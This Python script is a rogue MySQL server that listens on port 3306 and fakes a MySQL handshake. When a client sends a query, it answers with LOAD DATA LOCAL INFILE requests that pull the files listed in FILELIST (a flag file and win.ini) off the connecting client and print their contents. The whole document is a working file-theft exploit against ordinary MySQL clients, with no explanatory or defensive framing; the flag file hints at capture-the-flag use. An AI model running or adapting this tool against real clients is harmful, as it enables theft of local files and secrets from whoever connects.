#!/usr/bin/env python
# coding: utf8
import socket
import asyncore
import asynchat
import struct
import typing

PORT = 3306

FILELIST = [
    r'c:\flag.txt',
    r'c:\Windows\win.ini',
]


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')

    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def to_bytes(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)
        return header + self.payload

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = raw_data[0]
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):
    def __init__(self, addr, listener):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.listener = listener
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                b'\x0a'
                b'5.6.28-0ubuntu0.14.04.1'
                b'\0'
                b'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71'
                b'\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00')
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data: typing.Optional[mysql_packet]):
        if isinstance(data, mysql_packet):
            data = data.to_bytes()
        if data is None:
            data = b''
            self.listener.finished()
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        self.ibuffer.append(data)

    def found_terminator(self):
        data = b''.join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == 0x3:
                        filename = self.listener.next_filename()
                        packet = mysql_packet(packet, b'\xFB' + filename.encode('utf-8'))
                        self.push(packet)
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'

                    elif packet.payload[0] == 0x1b:
                        self.push(mysql_packet(packet, b'\xfe\x00\x00\x02\x00'))
                        raise LastPacket()
                    elif packet.payload[0] == 0x02:
                        self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                        raise LastPacket()
                    elif packet.payload == b'\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        pass
                        # raise ValueError()
                else:
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                            raise LastPacket()
                        else:
                            print('[+] Filename :', self.listener.current_filename)
                            result = data[1:]
                            try:
                                result = result.decode('utf8')
                            except UnicodeDecodeError:
                                try:
                                    result = result.decode('gbk')
                                except UnicodeDecodeError as e:
                                    print('[-] Warning:', e)
                                pass
                            print('[+] Content:')
                            print(result)
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                        raise LastPacket()
                    else:
                        raise ValueError('Unknown packet')
            except LastPacket:
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                self.push(None)
                self.close_when_done()
        else:
            self.push(None)
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)
        self.filename_cursor = 0
        self.current_filename = ''
        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def next_filename(self):
        if self.filename_cursor >= len(FILELIST):
            self.filename_cursor = 0
        filename = FILELIST[self.filename_cursor]
        self.filename_cursor += 1
        self.current_filename = filename
        return filename

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            http_request_handler(pair, self)


if __name__ == '__main__':
    if len(FILELIST) == 0:
        print('[-] Filelist is empty!')
        exit(0)
    mysql_listener()
    asyncore.loop(1)
